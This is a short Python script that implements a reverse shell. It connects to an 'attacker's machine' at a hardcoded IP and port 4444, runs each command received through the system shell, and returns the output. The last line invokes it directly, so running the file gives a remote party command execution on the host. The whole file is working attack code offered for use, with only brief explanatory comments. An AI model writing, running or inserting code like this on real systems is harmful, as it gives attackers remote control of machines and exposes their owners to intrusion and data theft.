import socket
import subprocess

def Reversing_Shell(ip, port):
    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server (attacker's machine)
    client_socket.connect((ip, port))

    while True:
        # Receive a command from the server
        command = client_socket.recv(1024).decode()

        # If the server sends 'exit', break the loop and close the connection
        if command.lower() == 'exit':
            break

        # Execute the command received from the server
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        except Exception as e:
            output = str(e)

        # Send the result back to the server
        client_socket.send(output.encode())

    # Close the socket
    client_socket.close()

# Usage: Replace with the attacker's IP address and chosen port
Reversing_Shell('192.168.1.100', 4444)  # Replace with the attacker's IP and port
